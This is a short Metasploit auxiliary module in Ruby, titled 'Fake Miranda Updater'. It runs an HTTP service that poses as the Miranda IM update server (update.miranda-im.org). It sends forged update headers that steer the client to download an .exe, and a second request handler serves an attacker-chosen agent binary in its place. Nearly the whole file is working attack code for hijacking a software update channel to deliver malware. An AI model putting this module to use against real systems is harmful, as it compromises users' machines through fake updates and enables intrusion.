require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Update
	def initialize
		super(
			'Name'        => 'Fake Miranda Updater',
			'Version'     => '0.1',
			'Description'    => %q{
				This module provides a HTTP service that
			is designed to fake Miranda updates.
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 80 ]),
			], self.class)
		
		@base = {	
			'vh' => ['update.miranda-im.org'],
	    		'request' => [{
				'req' => 'update.php', 
				'type' => 'string', 
				'header'    => "text/html\r\nX-Miranda-Update: true\r\nX-Miranda-Version: 0.7.15\r\nX-Miranda-Version-Complete: 0.7.15.0\r\nX-Miranda-Notes-URL: http://update.miranda-im.org/2009/03/23/miranda-im-v0714-released/\r\nX-Miranda-Download-URL: http://update.miranda-im.org/miranda/miranda-im-v0.7.15-ansi.exe\r\n",
				'string' => '',
				'parse' => '',
				'file' => ''
			},
			{
				'req' => '.exe', #regex friendly
				'type' => 'agent', #file|string|agent
				'bin'    => 1,
				'method' => '', #any
				'string' => '',
				'parse' => '',
				'file' => ''
			}
			]
		}
	end

end
